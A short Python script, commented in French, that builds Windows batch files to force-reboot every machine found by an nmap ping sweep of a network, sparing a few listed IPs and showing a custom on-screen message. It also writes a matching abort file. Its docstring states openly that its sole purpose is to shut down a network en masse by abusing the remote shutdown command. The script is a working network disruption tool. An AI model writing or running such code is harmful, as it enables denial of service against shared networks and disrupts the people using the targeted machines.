def malveillance(reseau:str, noip:list[str], com:str, filename:str) -> None:
    """
    La commande malveillance existe dans l'unique but de shutdown en masse un réseau en abusant de la commande shutdown -i.
    Elle prends en paramètres :
    - reseau : nom du fichier contenant la liste d'ip
    - noip : sous forme d'une liste ["192.168.111.25", "192.168.111.2"] seront des IPs qui seront immunisé.
    - com : un commentaire a afficher sur l'écran
    - filename : qui est donc le nom du fichier .bat qui va être créer ainsi que son opposé, filename_comeback.bat
    """
    if com != "":
        commande = f'''start cmd /c "shutdown /r /c "{com}" /m \\\\'''
        commande_gentille = '''start cmd /c "shutdown /a /m \\\\'''
    else:
        commande = f'''start cmd /c "shutdown /r /m \\\\'''
        commande_gentille = '''start cmd /c "shutdown /a /m \\\\'''

    import re
    liste_ip = []
    match_ip = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    with open(reseau, 'r') as r:
        fichier_ip = r.readlines()

    for line in fichier_ip:
        liste_ip.append(match_ip.search(line)[0])

    code_evil = ""
    code_good = ""
    for ip in liste_ip:
        if ip in noip:
            pass
        else:
            code_good += f"{commande_gentille}{ip} \n"
            code_evil += f"{commande}{ip} \n"

    with open(f"{filename}.bat", 'w') as fe:
        fe.write(code_evil)

    with open(f"{filename}_annule.bat", 'w') as fg:
        fg.write(code_good)


malveillance("liste_ip.txt", ['192.168.111.1', '192.168.111.87', "192.168.111.84", "192.168.111.83", "192.168.111.85"], "Apanyan", "test")

'''
nmap -sn -T5 --min-parallelism 100 172.21.0.0/16 -oG liste_ip.txt
'''